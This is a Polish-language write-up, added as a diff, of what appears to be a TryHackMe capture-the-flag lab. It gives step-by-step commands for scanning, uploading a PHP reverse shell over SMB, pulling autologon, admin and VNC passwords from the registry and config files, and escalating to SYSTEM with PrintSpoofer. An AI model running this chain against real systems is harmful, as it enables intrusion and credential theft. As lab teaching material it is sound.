@@ -1,0 +1,209 @@
+Project 14 - Hasła VNC
+
+
+*Rekonesans*
+*Enumeracja za pomocą Nmap*
+```
+sudo nmap -sS -sV -vv --top-ports 1000 10.10.5.163 | grep open
+```
+Rezultat:
+Discovered open port 139/tcp on 10.10.5.163
+Discovered open port 135/tcp on 10.10.5.163
+Discovered open port 445/tcp on 10.10.5.163
+Discovered open port 3389/tcp on 10.10.5.163
+Discovered open port 5900/tcp on 10.10.5.163
+Discovered open port 443/tcp on 10.10.5.163
+Discovered open port 80/tcp on 10.10.5.163
+Discovered open port 21/tcp on 10.10.5.163
+
+*Enumeracja anonimowego serwera FTP*
+```
+sudo nmap -sS -sC -p 21 10.10.5.163
+```
+
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 11:55 EDT
+Nmap scan report for 10.10.5.163
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_11-14-20  04:26PM                  173 notice.txt
+
+Nmap done: 1 IP address (1 host up) scanned in 3.56 seconds
+zsh: segmentation fault  sudo nmap -sS -sC -p 21 10.10.5.163
+```
+
+*Logowanie na serwer FTP*
+```
+ftp 10.10.5.163
+login: anonymous
+password: nacisąć Enter
+```
+Po zalogowaniu się na serwer FTP widzimy, że istnieje plik o nazwie _notice.txt_
+```
+smbclient -L 10.10.5.163
+```
+
+*Przyczółek*
+Odwrotna powłoka php dla systemu Windows z instalacjami XAMPP
+Klonowanie repozytorium
+```
+git clone [https://github.com/ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell)
+```
+
+Edycja pliku php-reverse-shell.php:
+```
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('IP Kali LInux', 9000);
+$sh->run();
+unset($sh);
+```
+
+Przesłanie pliku na serwer za pomoca smbclient:
+```
+smbclient //IP Target/images$
+
+put php_reverse_shell.php
+```
+
+*Netcat*
+```
+nc -lnvp 9000 
+```
+
+*Można zrobić na dwa sposoby:*
+*Przeglądarka internetowa*
+```
+http://10.10.5.163/images/php_reverse_shell.php
+```
+Przeglądając stronę internetową, widzimy, że ładuje ona obrazy z katalogu /images/, więc powinniśmy być w stanie uruchomić naszą powłokę.php za pomocą żądania curl.
+
+lub
+
+*Kali Linux:*
+```
+curl http://ip Target/images/php_reverse_shell.php
+```
+
+*Zmiana użytkownika*
+```
+cd C:\Users\sign\Desktop
+more user_flag.txt
+Flaga: thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
+```
+
+**Pwnage**
+Użytkownik jest automatycznie zalogowany a nazwa użytkownika i hasło są przechowywane w rejestrze.
+Ponieważ używamy tylko wiersza poleceń, nie możemy używać regedit.exe ale możemy użyć zapytania reg do wyszukania wpisów rejestru:
+```
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+*DefaultUsername    REG_SZ    *
+```
+.\sign
+```
+*DefaultPassword    REG_SZ*    
+```
+gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
+```
+
+Plik Install_www_and_deploy.wygląda interesująco, ponieważ zawsze istnieje potrzeba wyższych uprawnień podczas instalowania oprogramowania:
+```
+cd c:\ installs
+
+more Install_www_and_deploy.bat
+
+Wynik:
+psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe
+```
+
+Jaki plik wykonywalny jest używany do uruchamiania instalatora z nazwą użytkownika i hasłem administratora?
+```
+PsExec.exe
+```
+
+*Uzyskanie hasła VNC. Hasła są przechowywane w postaci zaszyfrowanej w pliku .ini.*
+```
+cd C:\Program Files\uvnc bvba\UltraVNC
+
+more ultravnc.ini
+
+Wynik:
+passwd=B3A8F2D8BEA2F1FA70
+passwd2=00B2CDC0BADCAF1397
+```
+*Narzędzie do odzyskiwania hasła VNC*
+[Luigi Auriemma (aluigi.altervista.org)](http://aluigi.altervista.org/pwdrec.htm)
+
+[*VNC password decoder 0.2.1](http://aluigi.altervista.org/pwdrec/vncpwd.zip) 
+
+*Przesłanie VNC password decoder 0.2.1 na Target*
+```
+smbclient //10.10.107.148/images$
+
+Target:
+cd C:\installs
+copy C:\xampp\htdocs\images\vncpwd.exe
+
+vncpwd.exe ultravnc.ini
+```
+*Password:*   
+```
+5upp0rt9
+```
+
+**Eskalacja uprawnień**
+*Sprawdzanie uprawnień*
+```
+whoami /priv
+```
+Wynik:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+```
+Za każdym razem, gdy pojawi się SeImpersonatePrivilege, można prawie uznać to za natychmiastową wygraną.
+[PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n's blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+
+Wstępnie skompilowane pliki binarne:
+[Releases · itm4n/PrintSpoofer (github.com)](https://github.com/itm4n/PrintSpoofer/releases)
+
+*Przesłanie PrintSpoofer na Target*
+```
+smbclient //10.10.107.148/images$
+put PrintSpoofer64.exe
+
+Target:
+cd C:\xampp\htdocs\images
+copy C:\xampp\htdocs\images\PrintSpoofer64.exe
+
+PrintSpoofer64.exe -i -c cmd.exe
+```
+
+Wykonując go, plik binarny zapewnia dobrą powłokę jako nt / system-authority.
+```
+whoami
+Efekt: nt authority\system
+
+type C:\Users\Administrator\Desktop\admin_flag.txt
+
+Flaga: thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
+
+```
